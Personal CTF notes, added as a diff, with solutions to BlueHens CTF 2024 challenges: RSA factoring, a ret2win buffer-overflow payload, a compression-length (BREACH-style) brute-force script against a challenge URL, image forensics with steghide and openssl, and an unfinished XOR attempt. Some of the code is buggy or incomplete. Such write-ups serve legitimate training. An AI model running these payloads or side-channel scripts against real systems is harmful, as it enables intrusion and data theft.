@@ -1,0 +1,345 @@
+= 2024年11月09日
+
+== BlueHens CTF 2024
+
+=== Training Problem: Intro to RSA 
+----
+In [9]: p = getPrime(128)
+In [10]: q = getPrime(128)
+In [11]: N = p*q
+In [12]: bytes_to_long(flag) < N
+Out[12]: True
+In [13]: print(pow(bytes_to_long(flag), 65537, N), N)
+9015202564552492364962954854291908723653545972440223723318311631007329746475 51328431690246050000196200646927542588629192646276628974445855970986472407007
+----
+
+
+[,python]
+----
+
+from sympy import factorint
+from Crypto.Util.number import getPrime, bytes_to_long, long_to_bytes, inverse
+
+# p = getPrime(128)
+# q = getPrime(128)
+# N = p * q
+# # flag = b'hej'  # Replace this with your actual flag
+# flag = b'some_flag_here'  # Replace this with your actual flag
+# if bytes_to_long(flag) < N:
+#     message = bytes_to_long(flag)
+#     e = 65537
+#     ciphertext = pow(message,e,N)
+#     print("message:",message,long_to_bytes(message))
+#     print("N:", N)
+#     print("ciphertext:", message)
+
+    # d = pow(e, -1, N)
+    # print("d:", d)
+    # m = pow(M, d, N)
+    # print("m:", m)
+    # print(long_to_bytes(m))
+
+
+    # factors = factorint(N, limit=1000000)  # Set a limit on the number of primes to try
+    # if len(factors) == 2:
+    #     p, q = factors.keys()
+    #     print("Factors of N:", p, q)
+    # phi = (p-1)*(q-1)
+    # d = inverse(e, phi)
+    #
+    # plaintext = pow(ciphertext, d, N)
+    # print(long_to_bytes(plaintext).decode())
+
+
+cipher = 9015202564552492364962954854291908723653545972440223723318311631007329746475
+N = 51328431690246050000196200646927542588629192646276628974445855970986472407007
+e = 65537
+
+factors = factorint(N)  # Set a limit on the number of primes to try
+if len(factors) == 2:
+    p, q = factors.keys()
+    print("Factors of N:", p, q)
+    phi = (p-1)*(q-1)
+    d = inverse(e, phi)
+
+    plaintext = pow(ciphertext, d, N)
+    print(long_to_bytes(plaintext))
+    # p, q = 186574907923363749257839451561965615541, 275108975057510790219027682719040831427
+    print("Factors of N:", p, q)
+    phi = (p-1)*(q-1)
+    d = pow(e, -1, phi)
+
+    plaintext = pow(cipher, d, N)
+    print(long_to_bytes(plaintext))
+----
+
+
+=== Training Problem: Intro to PWN 
+
+``nc 0.cloud.chals.io 13545``
+
+----
+0000000000401196 <win>:
+  401196:	f3 0f 1e fa          	endbr64
+  40119a:	55                   	push   %rbp
+  40119b:	48 89 e5             	mov    %rsp,%rbp
+  40119e:	48 8d 05 5f 0e 00 00 	lea    0xe5f(%rip),%rax        # 402004 <_IO_stdin_used+0x4>
+  4011a5:	48 89 c7             	mov    %rax,%rdi
+  4011a8:	e8 d3 fe ff ff       	call   401080 <system@plt>
+  4011ad:	90                   	nop
+  4011ae:	5d                   	pop    %rbp
+  4011af:	c3                   	ret
+
+00000000004011b0 <vuln>:
+  4011b0:	f3 0f 1e fa          	endbr64
+  4011b4:	55                   	push   %rbp
+  4011b5:	48 89 e5             	mov    %rsp,%rbp
+  4011b8:	48 83 ec 30          	sub    $0x30,%rsp
+  4011bc:	48 8d 05 49 0e 00 00 	lea    0xe49(%rip),%rax        # 40200c <_IO_stdin_used+0xc>
+  4011c3:	48 89 c7             	mov    %rax,%rdi
+  4011c6:	e8 a5 fe ff ff       	call   401070 <puts@plt>
+  4011cb:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
+  4011cf:	48 89 c7             	mov    %rax,%rdi
+  4011d2:	b8 00 00 00 00       	mov    $0x0,%eax
+  4011d7:	e8 b4 fe ff ff       	call   401090 <gets@plt>
+  4011dc:	90                   	nop
+  4011dd:	c9                   	leave
+  4011de:	c3                   	ret
+
+00000000004011df <main>:
+  4011df:	f3 0f 1e fa          	endbr64
+  4011e3:	55                   	push   %rbp
+  4011e4:	48 89 e5             	mov    %rsp,%rbp
+  4011e7:	48 8b 05 82 2e 00 00 	mov    0x2e82(%rip),%rax        # 404070 <stdin@GLIBC_2.2.5>
+  4011ee:	b9 01 00 00 00       	mov    $0x1,%ecx
+  4011f3:	ba 02 00 00 00       	mov    $0x2,%edx
+  4011f8:	be 00 00 00 00       	mov    $0x0,%esi
+  4011fd:	48 89 c7             	mov    %rax,%rdi
+  401200:	e8 9b fe ff ff       	call   4010a0 <setvbuf@plt>
+  401205:	48 8b 05 54 2e 00 00 	mov    0x2e54(%rip),%rax        # 404060 <stdout@GLIBC_2.2.5>
+  40120c:	b9 01 00 00 00       	mov    $0x1,%ecx
+  401211:	ba 02 00 00 00       	mov    $0x2,%edx
+  401216:	be 00 00 00 00       	mov    $0x0,%esi
+  40121b:	48 89 c7             	mov    %rax,%rdi
+  40121e:	e8 7d fe ff ff       	call   4010a0 <setvbuf@plt>
+  401223:	48 8b 05 56 2e 00 00 	mov    0x2e56(%rip),%rax        # 404080 <stderr@GLIBC_2.2.5>
+  40122a:	b9 01 00 00 00       	mov    $0x1,%ecx
+  40122f:	ba 02 00 00 00       	mov    $0x2,%edx
+  401234:	be 00 00 00 00       	mov    $0x0,%esi
+  401239:	48 89 c7             	mov    %rax,%rdi
+  40123c:	e8 5f fe ff ff       	call   4010a0 <setvbuf@plt>
+  401241:	b8 00 00 00 00       	mov    $0x0,%eax
+  401246:	e8 65 ff ff ff       	call   4011b0 <vuln>
+  40124b:	b8 00 00 00 00       	mov    $0x0,%eax
+  401250:	5d                   	pop    %rbp
+  401251:	c3                   	ret
+----
+
+
+\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x90\x90\x90\x90\x90\x90\x90\x90\x96\x11\x40\x00
+
+401196
+
+\x96\x11\x40\x00
+
+===  Just a day at the breach 
+
+https://55nlig2es7hyrhvzcxzboyp4xe0nzjrc.lambda-url.us-east-1.on.aws/?payload=00[]
+
+
+payload is in hex, goal is to check if you can guess the string.
+67 is the length if the flag is found
+
+
+[, python]
+----
+import string
+
+CHARACTERS = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_{}"
+----
+
+.python code
+[, python]
+----
+import requests
+import zlib
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import threading
+import string
+
+CHARACTERS = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_{}"
+DOMAIN = "https://55nlig2es7hyrhvzcxzboyp4xe0nzjrc.lambda-url.us-east-1.on.aws"
+
+# format: udctf{XXXX}
+print("udctf{".encode().hex())
+
+def sniff(hex_string: str) -> int:
+    data = {"payload": hex_string.encode().hex()}
+    response = requests.get(DOMAIN, params=data)
+    if response.status_code != 200:
+        return -1
+    compressed_length = response.json()['sniffed']
+    return compressed_length
+
+
+num_threads = 50
+lock = threading.Lock()
+
+global found_flag
+found_flag = "udctf{"
+
+# with ThreadPoolExecutor(max_workers=num_threads) as executor:
+#     future_to_char = {executor.submit(sniff, char): char for char in CHARACTERS}
+#     
+#     for future in as_completed(future_to_char):
+#         char = future_to_char[future]
+#         try:
+#             result = future.result()
+#             print(result, char, char.encode().hex())
+#         except Exception as e:
+#             print(f"Error with character {char}: {e}")
+
+# def bruteforce():
+#     global found_flag
+#     for char in CHARACTERS:
+#         result = sniff(f"{found_flag}{char}")
+#         if result == 67:
+#             found_flag += char
+#             print(found_flag)
+#             bruteforce()
+
+found_flag="udctf{huffm4n_"
+def attempt_char(char):
+    global found_flag
+    with lock:  # Lock to ensure thread-safe access to found_flag
+        candidate = f"{found_flag}{char}"
+    result = sniff(candidate)
+    if result == 67:
+        with lock:
+            found_flag += char
+            print(f"Current flag: {found_flag}")
+        # Return True if this character was correct
+        return True
+    return False
+
+def bruteforce():
+    global found_flag
+    with ThreadPoolExecutor(max_workers=5) as executor:
+        while True:
+            # Submit a task for each character in CHARACTERS
+            futures = {executor.submit(attempt_char, char): char for char in CHARACTERS}
+            found = False
+            for future in futures:
+                if future.result():
+                    found = True  # A correct character was found
+                    break
+            if not found:  # If no correct character is found, break the loop
+                print("No further characters matched.")
+                break
+
+bruteforce()
+
+#Current flag: udctf{huffm4n_br34ched_l3t5_go}
+----
+
+
+=== Whispers of the Feathered Messenger
+
+Check EXIF.
+
+----
+Comment 	UGFzc3dvcmQ6IDVCNEA3cTchckVc
+----
+
+or just
+
+.$ file bird.jpeg 
+----
+bird.jpeg: JPEG image data, JFIF standard 1.01, aspect ratio, density 72x72, segment length 16, comment: "UGFzc3dvcmQ6IDVCNEA3cTchckVc", baseline, precision 8, 1080x1350, components 3
+----
+
+.$ echo 'UGFzc3dvcmQ6IDVCNEA3cTchckVc' | base64 -d
+----
+Password: 5B4@7q7!rE\
+----
+
+----
+$ steghide extract -sf bird.jpeg
+Enter passphrase: 5B4@7q7!rE\
+----
+
+no idea why, i don't know how to identify what kind of cipher was being used.
+seems like **Salted__** was the hint for it
+
+.solution
+----
+$ openssl enc -d -aes-256-cbc -in encrypted_flag.bin -out decrypted_flag.bin -pass pass:"5B4@7q7!rE\\"
+*** WARNING : deprecated key derivation used.
+Using -iter or -pbkdf2 would be better.
+$ l decrypted_flag.bin 
+.rw-r--r-- birb users 43 B Sat Nov  9 15:07:27 2024  decrypted_flag.bin
+$ cat decrypted_flag.bin 
+UDCTF{m0AybE_YoR3$!_a_f0recnicsEs_3xpEr^t}
+----
+
+
+=== XS9: ROX LOOHCS 
+
+[, python]
+----
+def xor(message: bytes, key: bytes) -> bytes:
+    xored = b''
+    for i in range(min(len(message), len(key))):
+        xor = message[i] ^ key[i]
+        xored += xor.to_bytes(1, byteorder='big')
+    return xored
+
+
+def crack_palindrome(cipher: bytes) -> bytes:
+    message = b''
+
+
+    loop_limit = (len(cipher) // 2) + (len(cipher) & 1)
+    for i in range(loop_limit):
+        M_0 = cipher[i]
+        M_n = cipher[len(cipher)-1-i]
+        for j in range(0, 128):
+            result = M_0 ^ j
+            if result == M_n:
+                message += result.to_bytes(1, byteorder='big')
+                continue
+
+def xor_table(data: bytes, bits: int = 8):
+    
+    pass
+
+
+flagmsg = "udctf{hello_wolrd}"
+# print(xor(flagmsg, flagmsg[::-1]).hex())
+#051c1b7f4652001b3008525d1b7f135c32160015453001551a7f0d1707167f1d1c4e0209011144134c5b005b4c1344110109024e1c1d7f1607170d7f1a55013045150016325c137f1b5d5208301b0052467f1b1c05
+
+
+
+# first = xor(flagmsg, flagmsg[::-1]).hex()
+# print(first)
+
+
+# flagmsg = "051c1b7f4652001b3008525d1b7f135c32160015453001551a7f0d1707167f1d1c4e0209011144134c5b005b4c1344110109024e1c1d7f1607170d7f1a55013045150016325c137f1b5d5208301b0052467f1b1c05"
+better1 = xor(flagmsg.encode(), flagmsg[::-1].encode())
+# print(better1.hex())
+decode = xor(better1, "udctf{"[::-1].encode())
+# print(decode)
+
+
+# print(crack_palindrome(better1))
+
+message = b'\x09\x0A\x0B\x0C'
+message = b'\xff\x00\x69\x11'
+cipher = xor(message, message[::-1])
+print(cipher.hex())
+key = b'\x11\x69\x0d\x10'
+decode = xor(cipher, key)
+print(decode.hex(), xor(key, key[::-1]).hex())
+----
+
+
